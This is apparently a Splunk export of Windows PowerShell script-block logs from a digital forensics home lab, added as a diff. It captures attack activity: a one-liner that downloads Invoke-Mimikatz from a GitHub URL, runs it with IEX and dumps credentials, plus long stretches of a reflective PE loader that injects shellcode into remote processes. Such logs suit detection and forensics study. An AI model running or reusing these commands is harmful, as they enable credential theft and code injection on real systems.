+		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
+		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
+		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
+		$MachineType = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType
+
+		#Enum MagicType
+		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
+		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
+		$MagicType = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType
+
+		#Enum SubSystemType
+		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
+		$SubSystemType = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType
+
+		#Enum DllCharacteristicsType
+		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
+		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
+		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
+		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
+		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
+		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
+		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
+		$DllCharacteristicsType = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType
+
+		###########    STRUCT    ###########
+		#Struct IMAGE_DATA_DIRECTORY
+		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
+		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
+		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
+		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
+		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY
+
+		#Struct IMAGE_FILE_HEADER
+		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
+		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
+		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
+		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
+		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
+		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
+		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER
+
+		#Struct IMAGE_OPTIONAL_HEADER64
+		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
+		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
+		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
+		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
+		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
+		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
+		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
+		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
+		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
+		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
+		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
+		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
+		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
+		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
+		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
+		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
+		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
+		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
+		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
+		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
+		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
+		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
+		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
+		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
+		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
+		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
+		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
+		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
+		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
+		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
+		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
+		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
+		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
+		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
+		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
+		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
+		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
+		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
+		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
+		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
+		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
+		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
+		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
+		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
+		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
+		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
+		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
+		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64
+
+		#Struct IMAGE_OPTIONAL_HEADER32
+		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
+		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
+		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
+		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
+		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
+		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
+		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
+		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
+		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
+		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
+		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
+		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
+		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
+		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
+	
+d261f22f-3dc8-4dc6-914f-cd178abb26fe","2025-11-23T14:39:14.627+0000",,,Execute,,"DESKTOP-78CU07R","DESKTOP-78CU07R",,401,"endpoint_services_processes windows_event_signature windows_ta_data","DESKTOP-78CU07R",401,"mydfir-project",,292,,,,,,,"//_::._=--/===-==-------==--====___=__=________.__",,,,,,,,,,,,medium,3,,,4104,,,,,,,"Microsoft-Windows-PowerShell/Operational",WinEventLog,,"chalitha-splunk",,,,,,"track_event_signatures",,"track_event_signatures",,,,,,"Microsoft Windows",
+,,,,,,"DESKTOP-78CU07R",,,,,,,,,,4104,3,,,,,,,,,,,,None,"Microsoft-Windows-PowerShell/Operational",,,,Creating,,,On,,,,,,,,,,,,,,,,,,399,,,,,,,,"S-1-5-21-1697325460-2044954953-441488130-1001",0,"Microsoft-Windows-PowerShell",,,Execute,,Warning,,"NOT_TRANSLATED",,,,,,,,,"11/23/2025 08:39:06.713 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=3
+ComputerName=DESKTOP-78CU07R
+User=NOT_TRANSLATED
+Sid=S-1-5-21-1697325460-2044954953-441488130-1001
+SidType=0
+SourceName=Microsoft-Windows-PowerShell
+Type=Warning
+RecordNumber=399
+Keywords=None
+TaskCategory=Execute a Remote Command
+OpCode=On create calls
+Message=Creating Scriptblock text (1 of 1):
+{$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr}
+
+ScriptBlock ID: d9b4359a-2f0f-4aab-a448-7d81dd579be4
+Path:","2025-11-23T14:39:06.713+0000",,"'Notepad'",Execute,"$wshell.Exec($app).ProcessID","DESKTOP-78CU07R","DESKTOP-78CU07R",,399,"endpoint_services_processes windows_event_signature windows_ta_data","DESKTOP-78CU07R",399,"mydfir-project",,19,,,,,,"(Get-ItemProperty $reg)","//_::._=--/===-==-------==--====___=__=___(__):\r{$","'HKCU:\Software\Microsoft\Notepad'","([Windows.Forms.Clipboard]::GetText())",,,,,,,,,,medium,3,,,4104,,,,,,,"Microsoft-Windows-PowerShell/Operational",WinEventLog,,"chalitha-splunk",,,,,,"track_event_signatures",,"track_event_signatures",,GPS,"'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'",,,"Microsoft Windows","New-Object -ComObject WScript.Shell"
+,,,,,,"DESKTOP-78CU07R",,,,,,,,,,4104,3,,,,,,,,,,,,None,"Microsoft-Windows-PowerShell/Operational",,,,Creating,,,On,,,,,,,,,,,,,,,,,,398,,,,,,,,"S-1-5-21-1697325460-2044954953-441488130-1001",0,"Microsoft-Windows-PowerShell",,,Execute,,Warning,,"NOT_TRANSLATED",,,,,,,,,"11/23/2025 08:39:06.701 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=3
+ComputerName=DESKTOP-78CU07R
+User=NOT_TRANSLATED
+Sid=S-1-5-21-1697325460-2044954953-441488130-1001
+SidType=0
+SourceName=Microsoft-Windows-PowerShell
+Type=Warning
+RecordNumber=398
+Keywords=None
+TaskCategory=Execute a Remote Command
+OpCode=On create calls
+Message=Creating Scriptblock text (1 of 1):
+& {$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr}
+
+ScriptBlock ID: fcc88318-53f3-406d-9315-6be5dc1e5d39
+Path:","2025-11-23T14:39:06.701+0000",,"'Notepad'",Execute,"$wshell.Exec($app).ProcessID","DESKTOP-78CU07R","DESKTOP-78CU07R",,398,"endpoint_services_processes windows_event_signature windows_ta_data","DESKTOP-78CU07R",398,"mydfir-project",,19,,,,,,"(Get-ItemProperty $reg)","//_::._=--/===-==-------==--====___=__=___(__):\r&_","'HKCU:\Software\Microsoft\Notepad'","([Windows.Forms.Clipboard]::GetText())",,,,,,,,,,medium,3,,,4104,,,,,,,"Microsoft-Windows-PowerShell/Operational",WinEventLog,,"chalitha-splunk",,,,,,"track_event_signatures",,"track_event_signatures",,GPS,"'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'",,,"Microsoft Windows","New-Object -ComObject WScript.Shell"
+,,"@(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)","@(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)","@(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)",,"DESKTOP-78CU07R",,,,,"[System.Runtime.InteropServices.Marshal]","Get-DelegateType","Add-SignedIntAsUnsigned",,,4104,3,,"[System.Runtime.InteropServices.Marshal]","Add-SignedIntAsUnsigned",,,,"[System.Runtime.InteropServices.Marshal]","Add-SignedIntAsUnsigned","$Win32Functions.GetModuleHandle.Invoke($ImportDllPath)","[System.Runtime.InteropServices.Marshal]",,None,"Microsoft-Windows-PowerShell/Operational",,,"$true",Splunk,,0,On,,,"Update-ExeFunctions",,,,"Get-PEDetailedInfo",,,0,,"Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName","@(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)",,,"$Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)","Invoke-CreateRemoteThread",328,,"[IntPtr]",,"$Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)","$CallDllMainSC1.Length","[System.Runtime.InteropServices.Marshal]","$SCPSMem","S-1-5-21-1697325460-2044954953-441488130-1001",0,"Microsoft-Windows-PowerShell",,"$Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)",Execute,"[System.Runtime.InteropServices.Marshal]",Warning,,"NOT_TRANSLATED",,,,,,"Get-Win32Constants","Get-Win32Functions","Get-Win32Types","11/23/2025 08:38:46.688 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=3
+ComputerName=DESKTOP-78CU07R
+User=NOT_TRANSLATED
+Sid=S-1-5-21-1697325460-2044954953-441488130-1001
+SidType=0
+SourceName=Microsoft-Windows-PowerShell
+Type=Warning
+RecordNumber=328
+Keywords=None
+TaskCategory=Execute a Remote Command
+OpCode=On create calls
+Message=Splunk could not get the description for this event. Either the component that raises this event is not installed on your local computer or the installation is corrupt.
+
+FormatMessage error:
+
+Got the following information from this event: 
+
+			Write-Verbose ""Update memory protection flags""
+				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
+			}
+			else
+			{
+				Write-Verbose ""PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute""
+			}
+		}
+		else
+		{
+			Write-Verbose ""PE being loaded in to a remote process, not adjusting memory permissions""
+		}
+		
+		
+		#If remote loading, copy the DLL in to remote process memory
+		if ($RemoteLoading -eq $true)
+		{
+			[UInt32]$NumBytesWritten = 0
+			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
+			if ($Success -eq $false)
+			{
+				Throw ""Unable to write shellcode to remote process memory.""
+			}
+		}
+		
+		
+		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
+		if ($PEInfo.FileType -ieq ""DLL"")
+		{
+			if ($RemoteLoading -eq $false)
+			{
+				Write-Verbose ""Calling dllmain so the DLL knows it has been loaded""
+				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
+				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
+				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
+				
+				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
+			}
+			else
+			{
+				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
+			
+				if ($PEInfo.PE64Bit -eq $true)
+				{
+					#Shellcode: CallDllMain.asm
+					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
+					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
+					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
+				}
+				else
+				{
+					#Shellcode: CallDllMain.asm
+					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
+					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
+					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
+				}
+				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
+				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
+				$SCPSMemOriginal = $SCPSMem
+				
+				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
+				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
+				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
+				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
+				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
+				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
+				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
+				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
+				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
+				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
+				
+				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
+				if ($RSCAddr -eq [IntPtr]::Zero)
+				{
+					Throw ""Unable to allocate memory in the remote process for shellcode""
+				}
+				
+				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
+				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
+				{
+					Throw ""Unable to write shellcode to remote process memory.""
+				}
+
+				$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
+				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
+				if ($Result -ne 0)
+				{
+					Throw ""Call to CreateRemoteThread to call GetProcAddress failed.""
+				}
+				
+				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
+			}
+		}
+		elseif ($PEInfo.FileType -ieq ""EXE"")
+		{
+			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
+			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
+			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
+			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr
+
+			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
+			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
+			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
+			Write-Verbose ""Call EXE Main function. Address: $ExeMainPtr. Creating thread for the EXE to run in.""
+
+			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null
+
+			while($true)
+			{
+				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
+				if ($ThreadDone -eq 1)
+				{
